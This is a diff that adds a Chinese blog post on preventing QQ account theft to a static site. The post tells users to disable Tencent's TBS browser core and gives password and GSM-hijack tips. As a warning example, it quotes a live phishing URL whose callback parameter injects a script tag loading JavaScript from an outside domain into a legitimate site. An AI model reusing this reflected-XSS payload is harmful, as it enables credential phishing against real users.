@@ -302,6 +302,199 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://kiminonawa.me/2018/08/08/浅谈QQ防盗号及对tbs内核的科普/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZPF">
+      <meta itemprop="description" content="ZPF's blog">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZPFの小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/08/08/浅谈QQ防盗号及对tbs内核的科普/" itemprop="url">
+                  浅谈QQ防盗号及对tbs内核的科普
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-08-08 15:39:44 / 修改时间：16:59:48" itemprop="dateCreated datePublished" datetime="2018-08-08T15:39:44+08:00">2018-08-08</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <pre><code>我一直就不喜欢墙内鹅厂这两款即时通讯软件，毕竟是少数服从多数，就算鹅厂再怎么渣渣用户再怎么骂，用户基数就摆在那里，你爱用也得用不爱用也得用……总不可能把所有班级的同学安利到signal里吧（。
+</code></pre><p>直到现在我还用的是酷安上精简过的qq底包，微信不知道出了什么幺蛾子开始闪退了（反正我也不咋用了，就不管了</p>
+<pre><code>好在腾讯很贴心的留了一个TBS调试页面，本来是方便开发者安装TBS内核的，但是……我们今天用的是它的删除功能，哼。
+
+
+有些人可能会觉得我写跑题了，明明讲防盗号怎么突然扯到这个，看了下面这个你就懂了。
+
+我拿今天某雨滴发给我的一个二维码举例子
+![](/images/0.png)
+这个二维码扫描出来是这个链接http://comment.ali213.net/ali-comment-renotice.php?callback=%00%00%00%00%00%00%00%3CscripT/src=//633832.pywbm.cn/template/app.js%3E%3C/scripT%3E%3C
+这个链接一看就很假不是么（如果你看不出来我也拿你没办法了）
+
+如果你使用的是腾讯自带的TBS内核（腾讯自称很安全）浏览器打开，是这样的：
+![](/images/4.png)
+这个页面看起来就像是个正常的qq空间登陆页面不是么，但其实他这是骗子做的钓鱼网站（做得一模一样要我看也看不出来）
+你如果不知道这是个钓鱼网站直接输入你的qq号和密码的话，你就会被盗号了，被盗号之后骗子就又会用你的号去给你的好友发钓鱼链接
+
+但如果我们关闭了TBS内核，强制调用系统Webview呢，请看效果：
+![](/images/3.png)
+他会直接屏蔽这个链接让你根本打不开！！！！！！！！！
+这就是强制调用系统Webview的好处！！！！
+
+腾讯做的这个TBS内核本来就是主打安全极速的，然而。。。。。打脸打的啪啪响。。。
+
+其实强制调用系统Webview还有一个好处：
+这里引用某大佬的一段话
+</code></pre><blockquote>
+<p>QQ和微信（微信其实鹅厂良心……）的内置浏览器就一个字，渣渣！（你看气得我连字都不会数了<br>你还能更慢一点么？？？嗯？<br>有的人可能会觉得是自己网速差，其实这个锅还得腾讯背。因为二者内置的浏览器内核不是Android原生的WebView，而是他们自家的X5 WebView内核，换句话说，腾讯浏览服务(Tencent Browsing Service, TBS)。<br>你说你好好的系统WebView不调用搞个这东西干啥，以为开发者都是吃饱了撑的吗……安全？安全你妹啊，你配跟我讲安全么……<br>所以我们的目标就是：没有TBS！</p>
+</blockquote>
+<p>下面是强制调用系统TBS的教程：</p>
+<p>1.使用微信/QQ内置浏览器打开 debugtbs.qq.com 。至于要怎么打开内置浏览器呢……随便给一个公众号发一条消息不就行了么。<br>比如说这样：<br><img src="/images/5.png" alt=""></p>
+<p>2.点击网址，就会发现来到了一个神奇的地方（求你们了把TBS改成大写吧我有强迫症啊……<br><img src="/images/2.png" alt=""><br>如果你们打开后的页面跟我不一样也没关系，都一样的。。。。<br>直接点击第一个清除TBS内核就行，然后关闭最后那个开关彻底禁用TBS（或者显示的是强制调用系统内核）<br>然后彻底重启qq（就是在后台杀掉qq进程，你们实在不会的可以重启手机。。。。。）</p>
+<p>3.重启以后再进入这个页面，点击”查看版本信息“。如果版本信息为0(null)就表示魔改成功了！<br><img src="/images/1.png" alt=""><br>魔改成功，浏览器开始调用原生WebView<br>然后就可以在qq内置浏览器中享受安全急速体验了</p>
+<p>微信也可以使用类似方式，TBS选项设置→强制使用系统内核。</p>
+<p>如果这样魔改之后并没有我以上所说的效果，那说明你的系统自带的webview需要更新了，方法比较复杂这里就不说了，请qq私聊我谢谢，或者直接把TBS装回去（魔改不适合你）</p>
+<pre><code>当然我以上说的这么多都是基于安卓系统的，ios系统我没用过也不了解
+
+顺便补充几点：
+1.不要在多个地方用相同的密码，防止撞库脱库（不懂啥意思的自己去百度/谷歌）
+2.不要随便点链接，对于一些可疑链接要学会查域名whois信息看他的注册时间（也请自行百度），不过现在直接用自己的域名做钓鱼的很少了，现在基本上都是js注入到一些大网站，这样qq检测不出来，也更容易使你上当受骗。
+3.有人会说我开了设备锁就万无一失了吧，我会告诉你，不一定！！！！！！！
+    具体详情请看最近很火的GMS劫持&lt;https://weibo.com/ttarticle/p/show?id=2309404269255519555590&gt;
+
+    这里大概说下怎么防范GMS劫持攻击：
+    1.如果你是电信用户，恭喜你，GMS劫持跟你没关系，因为电信用的是CDMA协议
+    2.如果你是移动用户，请开启VOLTE并设置LTE only，VOLTE开通方法：发送KTVoLTE到10086（前提是你的设备支持VOLTE）
+    3.如果你是联通用户，那你基本上也不用担心，因为联通好像已经弃用2G了
+
+
+    以上有什么不懂的欢迎在下面评论（如果可以的话）或者qq私聊我。。。。。
+</code></pre>
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+	</div>
+	
+	
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://kiminonawa.me/2018/07/30/测试文章/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -475,7 +668,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-count">2</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -483,6 +676,19 @@
 
               
 
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">标签</span>
+                  
+                </div>
               
             </nav>
           
@@ -561,7 +767,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共4字</span>
+  <span class="post-count">博客全站共1.4k字</span>
 </div>
         
 
